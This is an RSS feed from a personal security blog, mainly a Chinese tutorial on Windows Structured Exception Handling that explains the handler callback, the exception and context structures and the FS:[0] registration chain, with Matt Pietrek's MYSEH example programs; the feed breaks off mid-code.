<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
<channel>
  <title>Mark's Blog</title>
  <atom:link href="https://blog.mark0519.com/feed.xml" rel="self" type="application/rss+xml" />
  <link>https://blog.mark0519.com</link>
  <description>Live long and Pwn</description>
   
  <item>
    <title><![CDATA[其他]]></title>
    <link>https://blog.mark0519.com/#/others/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/others/README</guid>
    <description><![CDATA[<h1 id="其他">其他</h1>
<blockquote>
<p>诗酒趁年华。</p>
</blockquote>
<h2 id="fuzz-afl">Fuzz-AFL</h2>
<ul>
<li><p><strong>[22/07/10]</strong> <a href="/others/220710-afl1">AFL入门（一）</a></p></li>
<li><p><strong>[22/07/13]</strong> <a href="/others/220713-afl2">AFL入门（二）</a></p></li>
<li><p><strong>[22/07/17]</strong> <a href="/others/220717-afl3">AFL入门（三）</a></p></li>
</ul>
<h2 id="reverse">Reverse</h2>
<ul>
<li><p><strong>[23/09/03]</strong> <a href="/others/230903-re1-pe">Re1 - PE结构</a></p></li>
<li><p><strong>[23/09/04]</strong> <a href="/others/230904-re2-seh">Re2 - SEH</a></p></li>
</ul>]]></description>
    <pubDate>Mon, 4 Sep 2023 15:31:12 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Re2 - SEH(结构化异常处理)]]></title>
    <link>https://blog.mark0519.com/#/others/230904-re2-seh</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/others/230904-re2-seh</guid>
    <description><![CDATA[<h1 id="re2---seh结构化异常处理">Re2 - SEH(结构化异常处理)</h1>
<h2 id="x00-seh介绍">0x00 SEH介绍</h2>
<p><strong>SEH 结构化异常处理（Structured Exception Handling，SEH）</strong>是Windows操作系统处理程序错误或异常的技术。SEH是Windows操作系统的一种系统机制，与特定的程序设计语言无关。</p>
<p>SEH不仅可以简化程序错误处理,使程序更加健壮,还被广泛应用于反跟踪以及加解密中，外壳程序里大量地使用了SEH。</p>
<p>熟悉的<code>_try{} _finally{}</code>和<code>_try{} _except {}</code> 结构,这些并不是编译程序本身所固有的,本质上只不过是对windows内在提供的结构化异常处理的包装,不用这些高级语言编译器所提供的包装 ,照样可以利用系统提供的强大seh处理功能。</p>
<p>SEH分类：</p>
<ul>
<li>Per-Thread类型SEH（也称为<strong>线程异常处理</strong>），用来监视某线程代码是否发生异常。</li>
<li>Final类型SEH（也称为进程异常处理、筛选器或<strong>顶层异常处理</strong>），用于监视整个进程中所有线程是否发生异常。在整个进程中，该类型异常处理过程只有一个，可通过SetUnhandledExceptionFilter设置。</li>
</ul>
<p>总体来看，发生异常时系统的处理顺序为：</p>
<ol type="1">
<li><p>系统首先判断异常是否应发送给目标程序的异常处理例程,如果决定应该发送,并且目标程序正在被调试,则系统 挂起程序并向调试器发送EXCEPTION_DEBUG_EVENT消息.呵呵,这不是正好可以用来探测调试器的存在吗?</p></li>
<li><p>如果你的程序没有被调试或者调试器未能处理异常,系统就会继续查找你是否安装了线程相关的异常处理例程,如果 你安装了线程相关的异常处理例程,系统就把异常发送给你的程序seh处理例程,交由其处理.</p></li>
<li><p>每个线程相关的异常处理例程可以处理或者不处理这个异常,如果他不处理并且安装了多个线程相关的异常处理例程, 可交由链起来的其他例程处理.</p></li>
<li><p>如果这些例程均选择不处理异常,如果程序处于被调试状态,操作系统仍会再次挂起程序通知debugger.</p></li>
<li><p>如果程序未处于被调试状态或者debugger没有能够处理,并且你调用SetUnhandledExceptionFilter安装了最后异 常处理例程的话,系统转向对它的调用.</p></li>
<li><p>如果你没有安装最后异常处理例程或者他没有处理这个异常,系统会调用默认的系统处理程序,通常显示一个对话框, 你可以选择关闭或者最后将其附加到调试器上的调试按钮.如果没有调试器能被附加于其上或者调试器也处理不了,系统 就调用ExitProcess终结程序.</p></li>
<li><p>不过在终结之前,系统仍然对发生异常的线程异常处理句柄来一次展开,这是线程异常处理例程最后清理的机会.</p></li>
</ol>
<h2 id="x01-_except_handler">0x01 _except_handler</h2>
<p>当一个线程出现错误时，操作系统给你一个机会被告知这个错误。说得更明白一些就是，<strong>当一个线程出现错误时，操作系统调用用户定义的一个回调函数</strong>。这个回调函数可以做它想做的一切。例如它可以修复错误，或者它也可以播放一段音乐。无论回调函数做什么，它最后都要返回一个值来告诉系统下一步做什么。（这不是十分准确，但就此刻来说非常接近。）</p>
<p>异常的回调函数如下(Win32头文件EXCPT.H)</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>EXCEPTION_DISPOSITION  __cdecl _except_handler( </span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a>    <span class="kw">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a>    <span class="dt">void</span> * EstablisherFrame,</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a>    <span class="kw">struct</span> _CONTEXT *ContextRecord,</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a>    <span class="dt">void</span> * DispatcherContext);</span></code></pre></div>
<h3 id="exceptionrecord">1.1 ExceptionRecord</h3>
<p>这个函数<code>_except_handler</code>的第一个参数是一个指向<code>EXCEPTION_RECORD</code>结构的指针。这个结构在WINNT.H中定义，如下所示：</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _EXCEPTION_RECORD {</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a>   DWORD ExceptionCode;         <span class="co">//异常码</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a>   DWORD ExceptionFlags;        </span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a>   <span class="kw">struct</span> _EXCEPTION_RECORD *ExceptionRecord;</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a>   PVOID ExceptionAddress;      <span class="co">//异常发生的地址</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a>   DWORD NumberParameters;</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a>   DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a>} EXCEPTION_RECORD;</span></code></pre></div>
<p>这个结构<code>_EXCEPTION_RECORD</code>的第一个参数 <code>ExcepitonCode</code>成员是赋予异常的代码。通过在WINNT.H中搜索以“STATUS_”开头的<code>＃define</code>定义，可以得到一个异常代码列表。例如所有人都非常熟悉的<code>STATUS_ACCESS_VIOLATION</code>的代码是<code>0xC0000005</code>。一个更全面的异常代码列表可以在 Windows NT DDK的NTSTATUS.H中找到。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a>C0000005h----读写内存冲突</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>C0000094h----非法除<span class="dv">0</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a>C00000FDh----堆栈溢出或者说越界</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="dv">80000001</span><span class="er">h</span>----由Virtual Alloc建立起来的属性页冲突</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a>C0000025h----不可持续异常,程序无法恢复执行,异常处理例程不应处理这个异常</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a>C0000026h----在异常处理过程中系统使用的代码,如果系统从某个例程莫名奇妙的返回,则出现此代码,如果RtlUnwind时没有Exception Record参数也同样会填入这个代码</span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="dv">80000003</span><span class="er">h</span>----调试时因代码中int3中断</span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="dv">80000004</span><span class="er">h</span>----处于被单步调试状态</span></code></pre></div>
<p>此结构<code>_EXCEPTION_RECORD</code>的第四个参数<code>ExceptionAddress</code>是异常发生的地址。</p>
<h3 id="establisherframe">1.2 EstablisherFrame</h3>
<p>此结构的第二个参数<code>EstablisherFrame</code> 是一个指向<code>establisher</code>帧结构的指针。它是SEH中一个至关重要的参数。</p>
<h3 id="contextrecord">1.3 ContextRecord</h3>
<p>此结构的第三个参数<code>ContextRecord</code>是一个指向<code>CONTEXT</code>结构的指针。此结构在WINNT.H中定义，它代表某个特定线程的寄存器值。</p>
<p>下图显示了CONTEXT结构的成员。当用于SEH时，CONTEXT结构表示异常发生时寄存器的值。（这个CONTEXT结构就是GetThreadContext和SetThreadContext这两个API中使用 的那个CONTEXT结构）</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="kw">typedef</span> <span class="kw">struct</span> _CONTEXT</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a>{</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a>    DWORD ContextFlags;</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a>    DWORD Dr0;</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>    DWORD Dr1;</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>    DWORD Dr2;</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a>    DWORD Dr3;</span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>    DWORD Dr6;</span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a>    DWORD Dr7;</span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a>    FLOATING_SAVE_AREA FloatSave;</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a>    DWORD SegGs;</span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a>    DWORD SegFs;</span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a>    DWORD SegEs;</span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a>    DWORD SegDs;</span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a>    DWORD Edi;</span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a>    DWORD Esi;</span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a>    DWORD Ebx;</span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a>    DWORD Edx;</span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a>    DWORD Ecx;</span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a>    DWORD Eax;</span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a>    DWORD Ebp;</span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a>    DWORD Eip;</span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a>    DWORD SegCs;</span>
<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a>    DWORD EFlags;</span>
<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a>    DWORD Esp;</span>
<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a>    DWORD SegSs;</span>
<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a>} CONTEXT;</span></code></pre></div>
<p>这个回调函数<code>_except_handler</code>带四个参数，其中三个指向其它结构。在这些结构中，一些域比较重要，其它的就不那么重要。<strong>这里的关键是_exept_handler回调函数接收到操作系统传递过来的许多有价值的信息</strong>，例如异常的类型和发生的地址。使用这些信息，异常回调函数就能决定下一步做什么。</p>
<h2 id="x02-exception_registration">0x02 EXCEPTION_REGISTRATION</h2>
<p><code>EXCEPTION_REGISTRATION</code>结构的正式定义在<code>EXSUP.INC</code>中</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a>&lt;pre name=<span class="st">&quot;code&quot;</span> class=<span class="st">&quot;cpp&quot;</span>&gt;_EXCEPTION_REGISTRATION struc</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a>    prev                dd       ?</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a>    handler             dd       ?</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>_EXCEPTION_REGISTRATION ends</span></code></pre></div>
<p>这个结构在WINNT.H的NT_TIB结构的定义中被称为<code>_EXCEPITON_REGISTARTION_RECORD</code>。</p>
<p>回到手头的问题上来。当异常发生时，操作系统是如何知道到哪里去调用回调函数的呢？实际上，<code>EXCEPTION_REGISTARTION</code>结构由两个域组成，第一个可以先忽略。第二个域<code>handler</code>，包含一个指向<code>_except_handler</code>回调函数的指针。</p>
<p><strong>结构化异常处理是基于线程的</strong>-也就是说，每个线程有它自己的异常处理回调函数。</p>
<p>在Windows NT、Windows 95、Win32s上，存在一个关键的win32数据结构：线程信息块 TIB</p>
<p><strong>线程信息块（Thread Information/Environment Block，TIB或TEB）</strong>。<strong>TIB的第一个DWORD是一个指向线程的EXCEPTION_REGISTARTION结构的指针。在基于Intel处理器的Win32平台上，FS寄存器总是指向当前的TIB。因此在FS:[0]处你可以找到一个指向EXCEPTION_REGISTARTION结构的指针。</strong></p>
<p>当异常发生时，系统查找出错线程的TIB，获取一个指向<code>EXCEPTION_REGISTRATION</code>结构的指针。在这个结构中有一个指向<code>_except_handler</code>回调函数的指针。现在操作系统已经知道了足够的信息去调用<code>_except_handler</code>函数</p>
<p><img src="https://pic.imgdb.cn/item/64f565a2661c6c8e543d18b5.jpg" /></p>
<h2 id="x03-myseh">0x03 MySEH</h2>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="co">//==================================================</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="co">// MYSEH - Matt Pietrek 1997</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="co">// Microsoft Systems Journal, January 1997</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="co">// FILE: MYSEH.CPP</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="co">// 用命令行CL MYSEH.CPP编译</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a><span class="co">//==================================================</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a><span class="pp">#define WIN32_LEAN_AND_MEAN</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;windows.h&gt;</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a>DWORD scratch;</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a>EXCEPTION_DISPOSITION</span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>__cdecl</span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a>_except_handler(<span class="kw">struct</span> _EXCEPTION_RECORD* ExceptionRecord,</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a>    <span class="dt">void</span>* EstablisherFrame,</span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>    <span class="kw">struct</span> _CONTEXT* ContextRecord,</span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>    <span class="dt">void</span>* DispatcherContext)</span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a>{</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>    <span class="dt">unsigned</span> i;</span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a>    <span class="co">// 指明是我们让流程转到我们的异常处理程序的</span></span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a>    printf(<span class="st">&quot;Hello from an exception handler</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a>    <span class="co">// 改变CONTEXT结构中EAX的值，以便它指向可以成功进写操作的位置</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a>    ContextRecord-&gt;Eax = (DWORD)&amp;scratch;</span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a>    <span class="co">// 告诉操作系统重新执行出错的指令</span></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a>    <span class="cf">return</span> ExceptionContinueExecution;</span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>}</span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a></span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a></span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a><span class="dt">int</span> main()</span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a>{</span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>    DWORD handler = (DWORD)_except_handler;</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a>    __asm</span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a>    {</span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a>        <span class="co">// 创建EXCEPTION_REGISTRATION结构：</span></span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a>        push handler <span class="co">// handler函数的地址</span></span>
<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a>        push FS : [<span class="dv">0</span>] <span class="co">// 前一个handler函数的地址</span></span>
<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>        mov FS : [<span class="dv">0</span>] , ESP <span class="co">// 安装新的EXECEPTION_REGISTRATION结构</span></span>
<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a>    }</span>
<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>    __asm</span>
<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a>    {</span>
<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a>        mov eax, <span class="dv">0</span>     <span class="co">// 将EAX清零</span></span>
<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a>        mov[eax], <span class="dv">1</span> <span class="co">// 写EAX指向的内存从而故意引发一个错误</span></span>
<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a>    }</span>
<span id="cb6-43"><a href="#cb6-43" aria-hidden="true"></a>    printf(<span class="st">&quot;After writing!</span><span class="sc">\n</span><span class="st">&quot;</span>);</span>
<span id="cb6-44"><a href="#cb6-44" aria-hidden="true"></a>    __asm</span>
<span id="cb6-45"><a href="#cb6-45" aria-hidden="true"></a>    {</span>
<span id="cb6-46"><a href="#cb6-46" aria-hidden="true"></a>        <span class="co">// 移去我们的EXECEPTION_REGISTRATION结构</span></span>
<span id="cb6-47"><a href="#cb6-47" aria-hidden="true"></a>        mov eax, [ESP]    <span class="co">// 获取前一个结构</span></span>
<span id="cb6-48"><a href="#cb6-48" aria-hidden="true"></a>        mov FS : [<span class="dv">0</span>] , EAX <span class="co">// 安装前一个结构</span></span>
<span id="cb6-49"><a href="#cb6-49" aria-hidden="true"></a>        add esp, <span class="dv">8</span>       <span class="co">// 将我们的EXECEPTION_REGISTRATION弹出堆栈</span></span>
<span id="cb6-50"><a href="#cb6-50" aria-hidden="true"></a>    }</span>
<span id="cb6-51"><a href="#cb6-51" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb6-52"><a href="#cb6-52" aria-hidden="true"></a>}</span></code></pre></div>
<p>使用<code>Visual Studio 2022 win x86 Debug</code>编译并运行，可以看到成功调用了自己写的异常处理：</p>
<p><img src="https://pic.imgdb.cn/item/64f56c50661c6c8e543e49a9.jpg" /></p>
<p>它只有两个函数。main函数使用了三个内联汇编块。</p>
<p>第一个内联汇编块通过两个PUSH指令（<code>PUSH handler</code>和<code>PUSH FS:[0]</code>）在堆栈上创建了一个<code>EXCEPTION_REGISTRATION</code>结构。<code>PUSH FS:[0]</code>这条指令保存了先前的<code>FS:[0]</code>中的值作为这个结构的一部分，但这在此刻并不重要。重要的是现在堆栈上有一个8字节的 <code>EXCEPTION_REGISTRATION</code>结构。紧接着的下一条指令（<code>MOV FS:[0],ESP</code>）使线程信息块中的第一个DWORD指向了新的<code>EXCEPTION_REGISTRATION</code>结构。</p>
<p>第二个<code>__asm</code>块通过先把EAX寄存器清零（<code>MOV EAX,0</code>）然后把此寄存器的值作为内存地址让下一条指令（<code>MOV [EAX],1</code>）向此地址写入数据而故意引发一个错误。</p>
<p>最后的<code>__asm</code>块移除这个简单的异常处理程序：它首先恢复了FS:[0]中先前的内容，然后把 <code>EXCEPTION_REGISTRATION</code>结构弹出堆栈（<code>ADD ESP,8</code>）。</p>
<p>当<code>MOV [EAX],1</code>这条指令执行时，它引发一个访问违规。系统在FS:[0]处的TIB中查找，然后发现了一个指向 <code>EXCEPTION_REGISTRATION</code>结构的指针。在MYSEH.CPP中，在这个结构中有一个指向<code>_except_handler</code>函数的指针。 系统然后把所需的四个参数（我在前面已经说过）压入堆栈，接着调用<code>_except_handler</code>函数。</p>
<p>一旦进入<code>_except_handler</code>，这段代码首先通过一个printf语句表明“哈!是我让它转到这里的！”。接着，<code>_except_handler</code>修复了引发错误的问题——即EAX寄存器指向了一个不能写的内存地址（地址0）。修复方法就是改变<code>CONTEXT</code>结构中的EAX的值使它指向一个允许写的 位置。在这个简单的程序中，我专门为此设置了一个DWORD变量（scratch）。<code>_except_handler</code>函数最后的动作是返回 <code>ExceptionContinueExecution</code>这个值，它在EXCPT.H文件中定义。</p>
<p>当操作系统看到返回值为<code>ExceptionContinueExecution</code>时，它将其理解为你已经修复了问题，而引起错误的那条指令应该被重新执行。由于我的<code>_except_handler</code>函数已经让EAX寄存器指向一个合法的内存，<code>MOV [EAX],1</code>指令再次执行，这次main函数一切正常。</p>
<h2 id="x04-seh的prev链表">0x04 SEH的prev链表</h2>
<p>虽然这个异常回调机制很好，但它并不是一个完美的解决方案。对于稍微复杂一些的应用程序来说，仅用一个函数就能处理程序中任何地方都可能发生的异常是相当困难的。一个更实用的方案应该是有多个异常处理例程，每个例程针对程序中的一部分。实际上，操作系统提供的正是这个功能。</p>
<p>这就要回到之前的<code>EXCEPTION_REGISTRATION</code>结构体，这个结构的第一个成员，称为<code>prev</code>，前面我们暂时把它忽略了。它实际上是一个指向另外一个EXCEPTION_REGISTRATION结构的指针。这第二个EXCEPTION_REGISTRATION结构可以有一个完全不同的处理函数。它的prev域可以指向第三个EXCEPTION_REGISTRATION结构，依次类推。<strong>简单地说，就是有一个EXCEPTION_REGISTRATION结构链表。线程信息块的第一个DWORD（在基于Intel CPU的机器上是FS:[0]）指向这个链表的头部。</strong></p>
<p>当异常发生时，系统遍历这个链表以查找一个（其异常处理程序）同意处理这个异常的<code>EXCEPTION_REGISTRATION</code>结构。</p>
<p>在 MYSEH.CPP中，异常处理程序通过返回<code>ExceptionContinueExecution</code>表示它同意处理这个异常。异常回调函数也可以拒绝处理 这个异常。在这种情况下，系统移向链表的下一个<code>EXCEPTION_REGISTRATION</code>结构并询问它的异常回调函数，看它是否同意处理这个异常。下图显示了这个过程。一旦系统找到一个处理这个异常的回调函数，它就停止遍历链表。</p>
<p><img src="https://pic.imgdb.cn/item/64f57084661c6c8e543f1838.jpg" /></p>
<p>下面用代码看看实际情况：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="co">//=================================================</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="co">// MYSEH2 - Matt Pietrek 1997</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="co">// Microsoft Systems Journal, January 1997</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="co">// FILE: MYSEH2.CPP</span></span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="co">// 使用命令行CL MYSEH2.CPP编译</span></span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="co">//=================================================</span></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a><span class="pp">#define WIN32_LEAN_AND_MEAN</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;windows.h&gt;</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a>EXCEPTION_DISPOSITION</span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a>__cdecl _except_handler(</span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a>              <span class="kw">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span>
<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a>              <span class="dt">void</span> * EstablisherFrame,</span>
<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a>              <span class="kw">struct</span> _CONTEXT *ContextRecord,</span>
<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a>               <span class="dt">void</span> * DispatcherContext )</span>
<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a>{</span>
<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a>    printf( <span class="st">&quot;Home Grown handler: Exception Code: %08X Exception Flags %X&quot;</span>,</span>
<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a>            ExceptionRecord-&gt;ExceptionCode, ExceptionRecord-&gt;ExceptionFlags );</span>
<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a>    </span>
<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a>    <span class="cf">if</span> ( ExceptionRecord-&gt;ExceptionFlags &amp; <span class="dv">1</span> )</span>
<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a>        printf( <span class="st">&quot; EH_NONCONTINUABLE&quot;</span> );</span>
<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a>    <span class="cf">if</span> ( ExceptionRecord-&gt;ExceptionFlags &amp; <span class="dv">2</span> )</span>
<span id="cb7-23"><a href="#cb7-23" aria-hidden="true"></a>        printf( <span class="st">&quot; EH_UNWINDING&quot;</span> );</span>
<span id="cb7-24"><a href="#cb7-24" aria-hidden="true"></a>    <span class="cf">if</span> ( ExceptionRecord-&gt;ExceptionFlags &amp; <span class="dv">4</span> )</span>
<span id="cb7-25"><a href="#cb7-25" aria-hidden="true"></a>        printf( <span class="st">&quot; EH_EXIT_UNWIND&quot;</span> );</span>
<span id="cb7-26"><a href="#cb7-26" aria-hidden="true"></a>    <span class="cf">if</span> ( ExceptionRecord-&gt;ExceptionFlags &amp; <span class="dv">8</span> ) <span class="co">// 注意这个标志</span></span>
<span id="cb7-27"><a href="#cb7-27" aria-hidden="true"></a>        printf( <span class="st">&quot; EH_STACK_INVALID&quot;</span> );</span>
<span id="cb7-28"><a href="#cb7-28" aria-hidden="true"></a>    <span class="cf">if</span> ( ExceptionRecord-&gt;ExceptionFlags &amp; <span class="bn">0x10</span> )   <span class="co">// 注意这个标志</span></span>
<span id="cb7-29"><a href="#cb7-29" aria-hidden="true"></a>        printf( <span class="st">&quot; EH_NESTED_CALL&quot;</span> );</span>
<span id="cb7-30"><a href="#cb7-30" aria-hidden="true"></a>        printf( <span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span> );</span>
<span id="cb7-31"><a href="#cb7-31" aria-hidden="true"></a> </span>
<span id="cb7-32"><a href="#cb7-32" aria-hidden="true"></a>    <span class="co">// 我们不想处理这个异常，让其它函数处理吧</span></span>
<span id="cb7-33"><a href="#cb7-33" aria-hidden="true"></a>    <span class="cf">return</span> ExceptionContinueSearch;</span>
<span id="cb7-34"><a href="#cb7-34" aria-hidden="true"></a>}</span>
<span id="cb7-35"><a href="#cb7-35" aria-hidden="true"></a> </span>
<span id="cb7-36"><a href="#cb7-36" aria-hidden="true"></a> </span>
<span id="cb7-37"><a href="#cb7-37" aria-hidden="true"></a><span class="dt">void</span> HomeGrownFrame( <span class="dt">void</span> )</span>
<span id="cb7-38"><a href="#cb7-38" aria-hidden="true"></a>{</span>
<span id="cb7-39"><a href="#cb7-39" aria-hidden="true"></a>    DWORD handler = (DWORD)_except_handler;</span>
<span id="cb7-40"><a href="#cb7-40" aria-hidden="true"></a>    __asm</span>
<span id="cb7-41"><a href="#cb7-41" aria-hidden="true"></a>    {</span>
<span id="cb7-42"><a href="#cb7-42" aria-hidden="true"></a>       <span class="co">// 创建EXCEPTION_REGISTRATION结构：</span></span>
<span id="cb7-43"><a href="#cb7-43" aria-hidden="true"></a>       push handler       <span class="co">// handler函数的地址</span></span>
<span id="cb7-44"><a href="#cb7-44" aria-hidden="true"></a>       push FS:[<span class="dv">0</span>]        <span class="co">// 前一个handler函数的地址</span></span>
<span id="cb7-45"><a href="#cb7-45" aria-hidden="true"></a>       mov FS:[<span class="dv">0</span>],ESP     <span class="co">// 安装新的EXECEPTION_REGISTRATION结构</span></span>
<span id="cb7-46"><a href="#cb7-46" aria-hidden="true"></a>    }</span>
<span id="cb7-47"><a href="#cb7-47" aria-hidden="true"></a> </span>
